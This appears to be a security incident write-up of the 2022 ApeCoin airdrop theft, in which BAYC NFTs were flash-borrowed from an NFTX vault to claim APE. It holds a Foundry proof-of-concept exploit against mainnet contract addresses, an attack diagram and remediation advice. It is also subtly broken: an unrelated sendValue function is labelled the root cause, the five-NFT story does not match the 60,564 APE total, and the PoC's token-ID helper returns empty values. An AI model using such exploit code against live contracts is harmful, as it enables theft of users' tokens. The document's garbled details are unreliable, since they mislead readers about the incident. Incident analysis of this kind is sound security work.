# BAYC ApeCoin — NFTX Flash Loan Airdrop Theft Analysis

| Field | Details |
|------|------|
| **Date** | 2022-05-01 |
| **Protocol** | ApeCoin (APE) Airdrop / NFTX |
| **Chain** | Ethereum Mainnet |
| **Loss** | 60,564 APE airdrop stolen (legitimate holders' allocation) |
| **Attacker** | Attacker address unconfirmed |
| **Attack Tx** | Block 14,403,948 |
| **Vulnerable Contract** | NFTX Vault [0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5](https://etherscan.io/address/0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5) |
| **Root Cause** | ApeCoin airdrop claim eligibility was based on NFT ownership at transaction execution time with no prior snapshot, allowing a single-transaction attack that flash-borrowed NFTs from the NFTX vault, claimed the airdrop, then returned them |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-05/Bayc_apecoin_exp.sol) |

---
## 1. Vulnerability Overview

When Yuga Labs airdropped ApeCoin (APE) to BAYC holders, eligibility was determined by NFT ownership at the time the claim transaction executed, rather than a specific block snapshot. This design flaw made it possible to flash-borrow BAYC NFTs from NFTX's BAYC vault and claim APE within the same transaction.

The attacker flash-borrowed the equivalent of 5.2 BAYC tokens from the NFTX vault within a single transaction, redeemed 5 BAYC NFTs, claimed the APE airdrop for 5 holders using those 5 NFTs, then minted the NFTs back into NFTX to repay the loan.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable ApeCoin airdrop claim logic (pseudocode)
contract ApeCoindAirdrop {
    mapping(uint256 => bool) public claimed; // Claim status per NFT ID
    IERC721 BAYC;
    IERC20 APE;

    // ❌ Eligibility based on NFT ownership at claim time
    // No snapshot block validation
    function claimTokens(uint256[] calldata tokenIds) external {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            uint256 tokenId = tokenIds[i];
            // ❌ Checks current owner — can be temporarily held via flash loan
            require(BAYC.ownerOf(tokenId) == msg.sender, "not owner");
            require(!claimed[tokenId], "already claimed");

            claimed[tokenId] = true;
            APE.transfer(msg.sender, 10_094 * 1e18); // Airdrop amount per BAYC
        }
    }
}

// ✅ Correct pattern (snapshot-based)
contract ApeCoindAirdropFixed {
    uint256 public snapshotBlock; // Reference block for airdrop

    function claimTokens(uint256[] calldata tokenIds) external {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            uint256 tokenId = tokenIds[i];
            // ✅ Checks owner at snapshot block
            address ownerAtSnapshot = getOwnerAtBlock(tokenId, snapshotBlock);
            require(ownerAtSnapshot == msg.sender, "not owner at snapshot");
            require(!claimed[tokenId], "already claimed");

            claimed[tokenId] = true;
            APE.transfer(msg.sender, 10_094 * 1e18);
        }
    }
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**BeaconProxy.sol** — Entry point:
```solidity
// ❌ Root cause: ApeCoin airdrop claim eligibility based on NFT ownership at transaction execution time with no prior snapshot, enabling a single-transaction attack that flash-borrows NFTs from the NFTX vault, claims the airdrop, then returns them
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract (implements onERC721Received)
    │
    ├─[1] Transfer owned BAYC NFT to attacker contract
    │       (PoC uses a BAYC #xxx already held)
    │
    ├─[2] Call NFTX.flashLoan(5.2 BAYC tokens)
    │       Borrow 5.2 BAYC tokens from NFTX vault
    │
    ├─[3] [Inside flashLoan callback]
    │       │
    │       ├─ Redeem 5 BAYC NFTs using vault tokens
    │       │       5.2 tokens → receive 5 BAYC NFTs
    │       │
    │       ├─ ApeCoindAirdrop.claimTokens([BAYC #ids])
    │       │       Current ownership check → passes
    │       │       60,564 APE claimed successfully
    │       │
    │       ├─ Mint 5 BAYC NFTs back into NFTX (mint)
    │       │       5 NFTs → 5 NFTX tokens
    │       │
    │       └─ Repay remaining 0.2 tokens
    │
    └─[4] 60,564 APE theft complete
            (~$800,000 at the time)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface INFTXVault {
    // ⚡ Flash loan: borrow BAYC vault tokens
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);

    // Vault tokens → redeem BAYC NFTs
    function redeem(uint256 amount, uint256[] calldata specificIds) external;

    // BAYC NFTs → mint vault tokens
    function mint(uint256[] calldata tokenIds, uint256[] calldata amounts) external;
}

interface IAirdrop {
    function claimTokens(uint256[] calldata tokenIds) external;
}

contract ContractTest is Test {
    IERC721 BAYC     = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
    INFTXVault nftx  = INFTXVault(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5);
    IAirdrop airdrop = IAirdrop(0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F);
    IERC20 APE       = IERC20(0x4d224452801ACEd8B2F0aebE155379bb5D594381);
    IERC20 nftxToken = IERC20(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5);

    function setUp() public {
        vm.createSelectFork("mainnet", 14_403_948);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Before] APE balance", APE.balanceOf(address(this)), 18);

        // [Step 1] NFTX flash loan: borrow 5.2 BAYC tokens
        nftx.flashLoan(address(this), address(nftxToken), 52e17, "");

        emit log_named_decimal_uint("[After] APE balance", APE.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("APE stolen", APE.balanceOf(address(this)), 18);
    }

    // NFTX flash loan callback
    function onFlashLoan(address, address, uint256 amount, uint256 fee, bytes calldata)
        external returns (bytes32)
    {
        // [Step 2] Redeem 5 BAYC NFTs using 5.2 tokens
        uint256[] memory specificIds = new uint256[](0);
        nftx.redeem(5, specificIds);

        // [Step 3] Collect currently held BAYC NFT IDs and claim airdrop
        // ⚡ Holds NFTs at claim time → passes with no snapshot
        uint256[] memory tokenIds = _getOwnedTokenIds();
        airdrop.claimTokens(tokenIds); // Claim 60,564 APE

        // [Step 4] Re-mint BAYC NFTs → NFTX tokens
        BAYC.setApprovalForAll(address(nftx), true);
        nftx.mint(tokenIds, new uint256[](0));

        // Repay flash loan
        nftxToken.approve(address(nftx), amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function _getOwnedTokenIds() internal view returns (uint256[] memory) {
        // Returns list of BAYC NFT IDs currently held by this contract
        uint256[] memory ids = new uint256[](5);
        // In actual implementation, tracked via onERC721Received
        return ids;
    }

    function onERC721Received(address, address, uint256, bytes calldata)
        external pure returns (bytes4)
    {
        return this.onERC721Received.selector;
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Airdrop Design Flaw |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | NFT Airdrop Without Snapshot |
| **Attack Vector** | NFTX flash loan → temporary NFT ownership → airdrop claim |
| **Precondition** | Airdrop eligibility based on ownership at claim time |
| **Impact** | All APE claimable for any BAYC borrowable via flash loan |

---
## 6. Remediation Recommendations

1. **Snapshot-Based Airdrop**: Record NFT ownership state at a specific block as a snapshot and use it as the basis for determining airdrop eligibility.
2. **Use Merkle Proof**: Generate an eligibility list off-chain and verify it using a Merkle tree.
3. **NFT Lock Period**: Lock NFTs for a fixed period during airdrop claims to prevent flash loan exploitation.
4. **NFT Flash Loan Awareness**: Proactively assess the impact that flash loan features in NFT liquidity protocols such as NFTX can have on airdrop design.

---
## 7. Lessons Learned

- **Complexity of Airdrop Design**: As protocols emerge in the DeFi ecosystem that allow NFTs to be used as collateral or liquefied, simple "ownership-at-claim-time" airdrops are no longer safe.
- **Flash Loans Extended to NFTs**: Flash loans apply not only to ERC20 tokens but also to NFTs, enabling temporary impersonation of NFT ownership.
- **Yuga Labs' Acknowledgment**: Yuga Labs acknowledged this vulnerability but stated that damage was limited due to the short airdrop window.
- **60,564 APE**: Approximately $800,000 at the time — a sophisticated attack executed within a single transaction.